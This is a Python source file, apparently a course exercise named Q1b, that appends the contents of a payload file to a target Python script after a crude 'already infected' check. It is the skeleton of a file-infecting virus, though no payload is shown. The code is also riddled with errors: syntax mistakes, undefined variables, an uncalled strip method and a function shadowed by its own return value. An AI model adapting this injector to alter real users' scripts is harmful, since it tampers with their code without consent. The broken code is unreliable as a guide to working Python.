import sys

def is_infected(file):
    with open(out_path, "r") as file:)
        for row in file:
            if row == f"{file}\n":
                return True
        return False

def is_script(script):
    required_statement = 'if __name__ == "__main__":'
    with open(script, 'r') as file:
        for row in file:
            if row.strip == required_statement:
                return True
    return False

def verify(target_file):
    required_statement = 'if __name__ == "__main__":'
    code = None
    
    if not is_script(target_file):
        print("Could not verify file is python script; no {required_statement} statement")
        return 0

    with open(input_script, "r") as file:
        for row in file:
            if is_infected(input_script):
                return 0


    return 1
            # add statement to find if script exists


def inject(target_file, payload_file):
    try:
        with open(target_file, 'a') as target_file, open(payload_file, 'r') as payload_file:
        target_file.write(payload_file.read())
        return 0
    except:
        print(f"An error occured injeting {payload_file}.")
        return 1

def main()
    target_file = sys.argv[1]

    if len(sys.argv) != 2:
        print(f"Usage: python3 Q1b.py {target_file}\n")
    out_path = "/Q1B.out"

    is_verified = verify(target_file)
    if not is_verified:
        print("Verifcation failed\n Quitting...")
        return 1

    payload_file = "/Q1B_payload.py"
    inject = inject(target_file, payload_file)
    if inject == 1: return 1

    return 0

main()